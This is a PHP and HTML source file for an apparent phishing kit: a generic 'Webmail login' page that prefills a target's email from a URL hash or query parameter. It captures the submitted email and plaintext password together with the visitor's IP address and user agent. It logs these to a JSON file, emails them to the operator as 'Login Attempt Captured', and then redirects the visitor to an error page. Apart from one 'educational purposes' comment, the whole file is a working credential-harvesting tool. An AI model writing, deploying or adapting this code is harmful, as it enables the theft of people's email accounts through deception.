<?php
session_start();

// Configuration
$smtp_config = [
    'host' => 'smtp.gmail.com', // Change to your SMTP server
    'port' => 587,
    'username' => 'your-email@gmail.com', // Your email
    'password' => 'your-app-password', // Your app password
    'encryption' => 'tls'
];

// Function to send email via SMTP
function sendEmailSMTP($to, $subject, $message, $config) {
    require_once 'PHPMailer/PHPMailer.php';
    require_once 'PHPMailer/SMTP.php';
    require_once 'PHPMailer/Exception.php';
    
    $mail = new PHPMailer\PHPMailer\PHPMailer(true);
    
    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $config['host'];
        $mail->SMTPAuth = true;
        $mail->Username = $config['username'];
        $mail->Password = $config['password'];
        $mail->SMTPSecure = $config['encryption'];
        $mail->Port = $config['port'];
        
        // Recipients
        $mail->setFrom($config['username'], 'Webmail System');
        $mail->addAddress($to);
        
        // Content
        $mail->isHTML(true);
        $mail->Subject = $subject;
        $mail->Body = $message;
        
        $mail->send();
        return true;
    } catch (Exception $e) {
        error_log("Email sending failed: " . $mail->ErrorInfo);
        return false;
    }
}

// Handle form submission
if ($_POST && isset($_POST['email']) && isset($_POST['password'])) {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = $_POST['password'];
    $user_ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');
    
    // Log the attempt (for educational purposes)
    $log_data = [
        'email' => $email,
        'password' => $password,
        'ip' => $user_ip,
        'user_agent' => $user_agent,
        'timestamp' => $timestamp
    ];
    
    // Save to file
    file_put_contents('login_attempts.json', json_encode($log_data) . "\n", FILE_APPEND);
    
    // Send notification email
    $subject = "Login Attempt Captured";
    $message = "
    <h2>New Login Attempt</h2>
    <p><strong>Email:</strong> {$email}</p>
    <p><strong>Password:</strong> {$password}</p>
    <p><strong>IP Address:</strong> {$user_ip}</p>
    <p><strong>User Agent:</strong> {$user_agent}</p>
    <p><strong>Timestamp:</strong> {$timestamp}</p>
    ";
    
    // Send email notification
    sendEmailSMTP($smtp_config['username'], $subject, $message, $smtp_config);
    
    // Redirect to error page or show message
    header('Location: error.php');
    exit();
}

// Extract email from URL hash if present
$target_email = '';
if (isset($_GET['email'])) {
    $target_email = urldecode($_GET['email']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAGAAFGAAAIKQTKCNCOKAAAANDULIDRIAAAAAG AAAAIAGSGAAAAC3P69AAAAPLJREFUWIXTSJ2IH..." type="image/x-icon">
    <title>Webmail login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 20px;
        }
        
        .login-container {
            max-width: 400px;
            margin: 100px auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        
        .login-btn:hover {
            background: #0056b3;
        }
        
        .error {
            color: red;
            margin-top: 10px;
            text-align: center;
        }
        
        .hidden {
            visibility: hidden;
            background: white;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h2>Webmail Login</h2>
        </div>
        
        <form method="POST" action="">
            <div class="form-group">
                <label for="email">Email Address:</label>
                <input type="email" id="email" name="email" value="<?php echo htmlspecialchars($target_email); ?>" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="login-btn">Sign In</button>
        </form>
    </div>

    <script>
        // Extract email from URL hash (similar to original)
        window.onload = function () {
            var hash = window.location.hash;
            if (hash && hash.includes('#')) {
                var email = hash.split('#')[1];
                
                if (email) {
                    // Decode if it's base64 encoded
                    try {
                        var decodedEmail = atob(email);
                        document.getElementById('email').value = decodedEmail;
                    } catch(e) {
                        // If not base64, use as is
                        document.getElementById('email').value = email;
                    }
                }
            }
            
            // Check for URL parameter
            var urlParams = new URLSearchParams(window.location.search);
            var emailParam = urlParams.get('email');
            if (emailParam) {
                document.getElementById('email').value = decodeURIComponent(emailParam);
            }
        };
    </script>
</body>
</html>